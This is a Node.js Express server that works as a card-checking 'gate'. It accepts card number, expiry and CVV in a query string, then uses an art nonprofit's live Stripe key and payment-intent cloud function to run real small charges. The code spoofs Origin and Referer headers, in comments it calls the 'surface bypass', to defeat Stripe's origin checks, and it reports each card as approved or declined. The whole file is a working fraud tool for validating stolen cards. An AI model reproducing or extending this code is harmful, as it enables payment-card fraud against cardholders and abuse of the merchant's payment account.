const express = require('express');
const axios = require('axios');
const app = express();
const PORT = process.env.PORT || 10000;

app.use(express.json());

// --- ARTPAN CONFIG ---
const ARTPAN_PK = 'pk_live_51QVIZEBQDKIMdEl0TH6zoYwCH8E5Q1XyxJ73HNSqz7kWQUDPelsHHplSQnRUDzQGkoC2PtEqKqhgT9pkltge0jaB00C63zAYQm';
const ARTPAN_INTENT_API = 'https://us-central1-artspanapp.cloudfunctions.net/createPaymentIntent';

// Function to generate the IDs Stripe expects
const genID = () => 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, (c) => {
    const r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);
    return v.toString(16);
});

app.get('/', (req, res) => res.send('ArtSpan Surface Bypass Active 🟢'));

app.get('/chk', async (req, res) => {
    const cardParam = req.query.card;
    if (!cardParam) return res.send('❌ Error: No card data.');

    const [num, mon, year, cvv] = cardParam.split('|').map(i => i.trim());
    const fullYear = year.length === 2 ? `20${year}` : year;

    try {
        // STEP 1: Get the Client Secret from ArtSpan's Cloud Function
        const intentRes = await axios.post(ARTPAN_INTENT_API, {
            amount: 200,
            email: `nero${Math.floor(Math.random()*999)}@gmail.com`,
            live: true
        });
        const secret = intentRes.data.clientSecret;
        const pi_id = secret.split('_secret')[0];

        // STEP 2: Create Payment Method (The "Surface" Bypass)
        // We use Referer: artspan.org to trick Stripe's surface check
        const pmRes = await axios.post('https://api.stripe.com/v1/payment_methods', 
            new URLSearchParams({
                'type': 'card',
                'card[number]': num,
                'card[cvc]': cvv,
                'card[exp_month]': parseInt(mon),
                'card[exp_year]': parseInt(fullYear),
                'key': ARTPAN_PK,
                'guid': genID(),
                'muid': genID(),
                'sid': genID(),
            }).toString(),
            {
                headers: {
                    'Accept': 'application/json',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Origin': 'https://js.stripe.com',
                    'Referer': 'https://www.artspan.org/', // MANDATORY BYPASS HEADER
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                }
            }
        ).catch(e => e.response);

        if (pmRes.data.error) {
            return res.send(`<h2>❌ Surface Error</h2><p>${pmRes.data.error.message}</p>`);
        }

        const pm_id = pmRes.data.id;

        // STEP 3: Confirm the Payment Intent with the PM ID
        const confirmRes = await axios.post(`https://api.stripe.com/v1/payment_intents/${pi_id}/confirm`, 
            new URLSearchParams({
                'payment_method': pm_id,
                'client_secret': secret,
                'key': ARTPAN_PK
            }).toString(),
            {
                headers: {
                    'Origin': 'https://www.artspan.org',
                    'Referer': 'https://www.artspan.org/'
                }
            }
        ).catch(e => e.response);

        const data = confirmRes.data;

        // RESPONSE HANDLING
        let statusColor = data.status === 'succeeded' ? 'green' : 'red';
        let resultTitle = data.status === 'succeeded' ? '✅ Approved' : '❌ Declined';
        let message = data.error ? data.error.message : 'Transaction Successful';

        res.send(`
            <div style="font-family: sans-serif; padding: 20px; border: 2px solid ${statusColor}; border-radius: 10px; max-width: 400px; margin: 50px auto; text-align: center;">
                <h1 style="color: ${statusColor};">${resultTitle}</h1>
                <p><b>Bank Response:</b> ${message}</p>
                <p><b>Status:</b> ${data.status}</p>
                <hr>
                <small>Gate: ArtSpan Direct Handshake Bypass</small>
            </div>
        `);

    } catch (err) {
        res.status(500).send(`<h2>❌ System Error</h2><p>${err.message}</p>`);
    }
});

app.listen(PORT, () => console.log(`ArtSpan API running on ${PORT}`));
